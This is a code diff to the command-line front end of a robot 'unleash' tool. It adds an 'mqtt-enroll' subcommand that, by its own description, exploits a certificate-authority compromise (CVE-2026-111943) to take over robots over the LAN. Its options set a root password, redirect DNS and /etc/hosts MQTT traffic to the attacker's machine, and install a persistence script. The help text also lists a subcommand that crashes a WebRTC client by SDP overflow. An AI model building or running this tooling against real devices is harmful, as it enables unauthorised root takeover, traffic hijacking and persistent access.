@@ -28,6 +28,7 @@ Quickstart:
 
 Subcommands:
   unleash enroll <robot-ip> [options]   Guided enrollment (the happy path)
+  unleash mqtt-enroll [options]         MQTT-first enrollment (no AES key needed)
   unleash serve [--port 8080]           Launch broker + API + dashboard
   unleash fetch-key --email <email>     Retrieve per-device AES key from cloud
   unleash crash [--robot-ip IP]         Crash WebRTC client via SDP overflow
@@ -54,6 +55,9 @@ def main():
 
     if sub == "enroll":
         _main_enroll()
+        return
+    if sub == "mqtt-enroll":
+        _main_mqtt_enroll()
         return
     if sub == "fetch-key":
         _main_fetch_key()
@@ -153,6 +157,79 @@ def _main_enroll():
 
     success = asyncio.run(session.run())
     sys.exit(0 if success else 1)
+
+
+def _main_mqtt_enroll():
+    parser = argparse.ArgumentParser(
+        prog="unleash mqtt-enroll",
+        description="MQTT-first enrollment via CVE-2026-111943 (eMudhra CA compromise). "
+                    "Enrolls robots without WebRTC — no AES key needed for firmware >= 1.1.15. "
+                    "Requires LAN adjacency and DNS redirect.",
+    )
+    parser.add_argument("--broker-ip",
+                        help="This machine's LAN IP (auto-detected)")
+    parser.add_argument("--password", default="unleash",
+                        help="Root password to set (default: unleash)")
+    parser.add_argument("--mqtt-port", type=int, default=17883,
+                        help="MQTT broker port (default: 17883)")
+    parser.add_argument("--upk-port", type=int, default=8899,
+                        help="UPK file server port (default: 8899)")
+    parser.add_argument("--ca-bundle",
+                        help="Path to CA bundle containing eMudhra intermediates "
+                             "(default: system bundle)")
+    parser.add_argument("--dns", action="store_true",
+                        help="Also start the DNS redirector")
+    parser.add_argument("--dns-port", type=int, default=53,
+                        help="DNS listen port (default: 53)")
+    parser.add_argument("--skip-redirect", action="store_true",
+                        help="Skip permanent /etc/hosts MQTT redirect")
+    parser.add_argument("--skip-persist", action="store_true",
+                        help="Skip ssh_guard.sh persistence install")
+    parser.add_argument("--timeout", type=float, default=300,
+                        help="Seconds to wait for robot connection (default: 300)")
+    parser.add_argument("--debug", action="store_true",
+                        help="Enable debug logging")
+    args = parser.parse_args(sys.argv[2:])
+
+    if args.debug:
+        logging.basicConfig(level=logging.DEBUG, format="  %(name)s: %(message)s")
+
+    from .enroll.mqtt_enroll import MQTTEnrollSession
+
+    session = MQTTEnrollSession(
+        broker_ip=args.broker_ip or "",
+        password=args.password,
+        mqtt_port=args.mqtt_port,
+        upk_port=args.upk_port,
+        ca_bundle=args.ca_bundle,
+        skip_redirect=args.skip_redirect,
+        skip_persist=args.skip_persist,
+        timeout=args.timeout,
+    )
+
+    async def _run():
+        dns_server = None
+        if args.dns:
+            from .net.dns import MQTTDNSRedirector
+            broker_ip = args.broker_ip or _get_local_ip() or "127.0.0.1"
+            dns_server = MQTTDNSRedirector(
+                broker_ip=broker_ip,
+                port=args.dns_port,
+            )
+            await dns_server.start()
+            print(f"  DNS redirector active on :{args.dns_port}")
+
+        try:
+            return await session.run()
+        finally:
+            if dns_server:
+                await dns_server.stop()
+
+    try:
+        success = asyncio.run(_run())
+        sys.exit(0 if success else 1)
+    except KeyboardInterrupt:
+        pass
 
 
 def _main_fetch_key():
